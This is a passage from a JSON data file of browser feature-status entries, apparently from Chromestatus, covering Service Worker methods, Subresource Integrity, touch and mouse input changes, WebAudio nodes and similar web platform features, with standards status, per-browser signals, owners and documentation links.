          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1002571",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "jungkee.song@samsung.com",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=478382",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Returns all Service Worker registrations for the current origin.",
    "id": 6734239512920064,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/getRegistrations"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 06:39:19.515780",
      "by": "Patket@microsoft.com"
    },
    "name": "Service Worker: ServiceWorkerRegistration.update()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/40",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=450507",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "update() pings the server for an updated version of this Service Worker registration without consulting caches.",
    "id": 5663070173003776,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:55.130560",
      "by": "ericbidelman@google.com"
    },
    "name": "Stop sending mouse position updates during scrolling",
    "tags": [
      "scroll",
      "hover",
      "mouse"
    ],
    "comments": "Here's an example of a user facing behavior change, using the jQuery UI tooltip (http://output.jsbin.com/teyinu/1/quiet). To see the behavior difference, place the mouse cursor over the red box, then scroll via mouse wheel or trackpad. Without this change, every 100ms, the tooltip moves to the location of the cursor. With this change, the tooltip only moves once scrolling is complete.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=675015",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "tdresser@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=317007",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://www.thecssninja.com/css/pointer-events-60fps/comment-page-1#comment-1647",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=99940",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "While scrolling via trackpad or mousewheel, we previously sent mouse position updates every 100ms. On pages with heavy mouse handlers or :hover styles, this could cause significant amounts of scroll jank.\r\n\r\nSending a mouse position update includes updating :hover styles, and dispatching mousemove, mouseover, mouseenter, mouseleave, and mouseout events.\r\n\r\nWe’re planning to stop sending mouse position updates while scrolling. Instead, we'll trigger this behavior 100ms after scrolling ends.",
    "id": 5697181675683840,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/d/msg/blink-dev/KIoVljZw5fc/EKGAoTeX8CQJ"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-26 06:38:42.324010",
      "by": "Patket@microsoft.com"
    },
    "name": "Subresource Integrity",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.w3.org/TR/SRI/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hacks.mozilla.org/2015/09/subresource-integrity-in-firefox-43/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "jww@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "ios": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "http://crbug.com/355467",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Subresource Integrity defines a mechanism by which user agents may verify that a fetched resource has been delivered without unexpected manipulation. In a nutshell, metadata inlined into HTML elements allows the browser to determine whether the resource that was downloaded matches the resource the page's author expected to download. This implementation covers only the two elements outlined in the spec: <script> and <link rel=\"stylesheet\"> elements.",
    "id": 6183089948590080,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script",
        "https://developer.mozilla.org/en-US/docs/Web/API/Request"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/subresource-integrity/index.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:55.432370",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch event timeout on mobile sites",
    "tags": [
      "touch",
      "timeout"
    ],
    "comments": "The touch timeout is but an intermediate solution as we work to provide a more functional and rational experience for unresponsive content. See crbug.com/504904.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "jdduke@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=497852",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Chrome on Android currently has a touch ACK timeout of 200ms for desktop sites. If the renderer does not respond to a touch event before the timeout delay, the touch sequence is cancelled and any associated gestures are dispatched.\r\n\r\nThis change restores a touch timeout for sites with a mobile-friendly viewport,  but with a timeout delay of 1 second.",
    "id": 5700830451728384,
    "resources": {
      "docs": [
        "https://docs.google.com/document/u/1/d/12k_LL_Ot9GjF8zGWP9eI_3IMbSizD72susba0frg44Y/view#heading=h.5zfdv2co2oj"
      ],
      "samples": [
        "rbyers.net/touch-timeout.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:28.465340",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch.rotationAngle",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://rawgit.com/w3c/touch-events/master/touchevents.html#widl-Touch-rotationAngle",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=493199",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The rotation angle, in degrees, of the contact area ellipse defined by Touch.radiusX and Touch.radiusY.",
    "id": 4639728380936192,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Touch/rotationAngle"
      ],
      "samples": [
        "https://rbyers.github.io/paint.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:03.729580",
      "by": "ericbidelman@google.com"
    },
    "name": "Treat file:// URLs as having unique origin",
    "tags": [
      "file url",
      "origin",
      "security origin",
      "security"
    ],
    "comments": "There will be some visible side effects when opening documents via a file:// URL. For example\r\n- a file:// URL will no longer be able to XHR itself\r\n- two subframes navigated to the same file:// URL will no longer be able to script each other synchronously.\r\n\r\nThe rationale behind this proposal is that using a filename as the security principal can be dangerous. There is no guarantee from an OS filesystem that a given filename always points to a unique object.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/rfc6454#section-4",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "alexmos@chromium.org",
          "dcheng@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://crbug.com/455882",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Similar to sandboxed iframes and data: URLs, treat file:// URLs as having unique origin.",
    "id": 5755326842273792,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:36.606430",
      "by": "ericbidelman@google.com"
    },
    "name": "Window.{move,resize}{To,By} with non-optional arguments",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#extensions-to-the-window-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "jl@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=453421",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The functions window.moveTo(), window.moveBy(), window.resizeTo() and window.resizeBy() throw TypeError when called with fewer than two arguments.",
    "id": 5130527078088704,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-07-10 14:17:19.154260",
      "by": "jmedley@google.com"
    },
    "name": "beforeinstallprompt event for web/native app install banners",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/manifest/#beforeinstallpromptevent-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/manifest/issues/417",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "owencm@chromium.org",
          "mgiuca@chromium.org",
          "talo@chromium.org",
          "slightlyoff@chromium.org",
          "benwells@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=459839",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An event for notifying the site that the browser is about to show an install banner, that also gives the site the ability to both suppress the banner, as well as show it later at a time of their choosing.\r\n\r\nRelated: https://www.chromestatus.com/features/4540065577435136",
    "id": 6560913322672128,
    "resources": {
      "docs": [
        "https://github.com/slightlyoff/AppInstallImprovements/blob/master/explainer.md#controlling-installation",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window#Event_handlers",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/onbeforeinstallprompt",
        "https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent"
      ],
      "samples": [
        "https://killer-marmot.appspot.com/web/",
        "https://github.com/GoogleChrome/samples/tree/gh-pages/app-install-banner"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-02-14 21:59:07.557310",
      "by": "jmedley@google.com"
    },
    "name": "rtcpMuxPolicy",
    "tags": [
      "RTCPeerConnection",
      "rtcpMuxPolicy",
      "negotiate"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/webrtc/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "zhihuang@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink>WebRTC>Network"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=685727",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The rtcpMuxPolicy is used by the application to specify its preferred policy regarding use of  RTP/RTCP multiplexing. \r\n\r\nWhen the policy is \"negotiate\", the ICE candidates for both RTP and RTCP will be gathered. If the remote-endpoint is capable of multiplexing RTCP, multiplex RTCP on the RTP candidates. If it is not, use both the RTP and RTCP candidates separately.\r\n\r\nNote: The removal of this feature is not certain. Please comment on the launch bug #685727 if there is any concern. ",
    "id": 5654810086866944,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-04-26 06:32:45.833330",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "Cache.add()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/41",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "gavinp@chromium.org",
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 44,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=427652",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "add() takes a RequestInfo object, fetches it and adds the response object into this Cache object.",
    "id": 5673980799221760,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/add"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:47.747040",
      "by": "ericbidelman@google.com"
    },
    "name": "Computed Property Names (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-object-initializer",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/34",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3754",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/es6objectliteralenhancements?term=computed%20prop",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows expression for property names in object literals and class literals",
    "id": 5654306493562880,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer#Computed_property_names"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/computed-properties-es6"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-26 06:32:13.127050",
      "by": "Patket@microsoft.com"
    },
    "name": "Document.scrollingElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/cssom-view/#dom-document-scrollingelement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1153322",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 44,
        "ios": 44,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=475531",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/183967",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Simple API to indicate whether 'body' or 'documentElement' is used for scrolling.  Used to ease transition to spec-compliant scrolling behavior.",
    "id": 4819604295647232,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/document/scrollingElement",
        "https://dev.opera.com/articles/fixing-the-scrolltop-bug/"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-26 06:31:15.114020",
      "by": "Patket@microsoft.com"
    },
    "name": "Fetch API: Request.context",
    "tags": [
      "request",
      "fetch",
      "context"
    ],
    "comments": "Firefox 39 shipped this but Mozilla plans to unship.\r\n\r\nChrome also has unshipped it.\r\nhttps://code.google.com/p/chromium/issues/detail?id=515786",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#concept-request-context",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!topic/mozilla.dev.platform/6i4a8JpJ6Ok/discussion",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "hiroshige@chromium.org",
          "shiva.jm@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=455116",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Request.context contains the context of the Request, such as \"fetch\", \"image\", \"script\", \"frame\", etc.",
    "id": 4699713102151680,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 06:29:55.416450",
      "by": "Patket@microsoft.com"
    },
    "name": "Notification.data and ServiceWorkerRegistration.getNotifications()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://notifications.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://notifications.spec.whatwg.org/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 44,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=442143",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support for the Notification.data attribute, which allows authors to attach some (immutable) data to a persistent Web Notification they are displaying.\r\n\r\nSupport for the static ServiceWorkerRegistration.getNotifications() method for getting all existing persistent notifications created by the current origin.",
    "id": 5736434757533696,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/notification/data",
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/getNotifications"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/push-messaging-and-notifications"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:30.879020",
      "by": "ericbidelman@google.com"
    },
    "name": "Parsing related_applications from Web Manifest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/manifest/issues/326",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 44
        },
        "owners": [
          "owencm@chromium.org",
          "talo@chromium.org",
          "slightlyoff@chromium.org",
          "benwells@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=459839#makechanges",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "We will start parsing the related_applications key in the web manifest to display install banners as described in https://www.chromestatus.com/features/4540065577435136\r\n\r\nhttps://github.com/slightlyoff/AppInstallImprovements/blob/master/explainer.md#offering-related-applications (see open pull request on the manifest spec: https://github.com/w3c/manifest/pull/344)",
    "id": 4754986680451072,
    "resources": {
      "docs": [
        "https://github.com/w3c/manifest/issues/326",
        "https://github.com/w3c/manifest/pull/344"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-26 06:25:47.417280",
      "by": "Patket@microsoft.com"
    },
    "name": "WebAudio: AudioBufferSourceNode.detune",
    "tags": [
      "Web Audio API",
      "AudioBufferSourceNode",
      "Detune"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/#AudioBufferSourceNode",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1116852",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=463279",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add ‘detune’ feature to AudioBufferSourceNode for the sample-accurate pitch control of sample playback.",
    "id": 5677186052784128,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/333",
        "https://github.com/WebAudio/web-audio-api/issues/497"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:58.916170",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: ChannelMergerNode Static Routing",
    "tags": [
      "ChannelMerger",
      "Web Audio API"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/#the-channelmergernode-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WebAudio/web-audio-api/issues/304#issuecomment-77603505",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 44
        },
        "owners": [
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 44,
        "flag": false,
        "android": 44,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=441451",
        "intervention": false
      },
      "opera": {
        "android": 31,
        "desktop": 31
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
